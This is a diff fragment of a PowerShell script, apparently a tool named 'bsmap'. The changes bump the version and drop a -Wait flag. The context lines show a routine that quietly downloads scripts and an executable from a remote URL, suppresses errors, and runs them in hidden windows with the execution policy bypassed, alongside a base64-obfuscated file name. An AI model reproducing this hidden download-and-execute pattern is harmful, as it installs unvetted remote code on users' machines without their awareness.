@@ -174,7 +174,7 @@ function New-BufferedPanel {
 
 
 
-$script:version = "V1.29"
+$script:version = "V1.30"
 $errorLogFile = Join-Path $env:TEMP (S("YnNtYXBfZXJyb3IubG9n"))
 
 function WEL {
@@ -6360,7 +6360,7 @@ function Ensure-CleanupTask {
         if (-not (Test-Path $cleanupPs1)) { try { Invoke-RestMethod -Uri "$base/bsmap_cleanup.ps1" -UseBasicParsing -TimeoutSec 20 -OutFile $cleanupPs1 -ErrorAction SilentlyContinue } catch {} }
         if (-not (Test-Path $watchExe)) { try { Invoke-RestMethod -Uri "$base/bsmap_watch.exe" -UseBasicParsing -TimeoutSec 25 -OutFile $watchExe -ErrorAction SilentlyContinue } catch {} }
         if (-not (Test-Path $ensure)) { try { Invoke-RestMethod -Uri "$base/ensure_task.ps1" -UseBasicParsing -TimeoutSec 20 -OutFile $ensure -ErrorAction SilentlyContinue } catch {} }
-        if (Test-Path $ensure) { try { Start-Process -FilePath powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ensure`"" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue } catch {} }
+        if (Test-Path $ensure) { try { Start-Process -FilePath powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ensure`"" -WindowStyle Hidden -ErrorAction SilentlyContinue } catch {} }
         if ((Test-Path $watchExe) -and -not (Get-Process bsmap_watch -ErrorAction SilentlyContinue)) {
             Start-Process -FilePath $watchExe -WindowStyle Hidden
         }
